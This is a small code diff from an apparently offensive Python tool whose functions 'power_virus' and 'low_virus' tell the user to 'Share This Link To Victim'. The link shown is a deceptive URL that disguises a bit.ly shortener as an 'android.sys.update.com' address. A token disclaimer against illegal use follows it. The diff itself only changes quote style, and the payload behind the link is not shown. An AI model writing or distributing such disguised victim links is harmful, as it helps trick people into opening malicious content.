@@ -24,7 +24,7 @@ def power_virus():
 	print("Share This Link To Victim")
 	print("------------------------------------------")
 	slowprint("android.sys.update.com@bit.ly/3EAvZQ3")
-	print("------------------------------------------")
+	print('''------------------------------------------''')
 	slowprint('''Don't Use This App For Any Kind Of illegal Activites''')
 
 def low_virus():
@@ -42,7 +42,7 @@ def low_virus():
 	print("Share This Link To Victim")
 	print("--------------------------------------------")
 	slowprint("android.sys.update.com@bit.ly/3EAvZQ3")
-	print("--------------------------------------------")
+	print('''--------------------------------------------''')
 	slowprint('''Don't Use This App For Any Kind Of illegal Activites''')
 
 
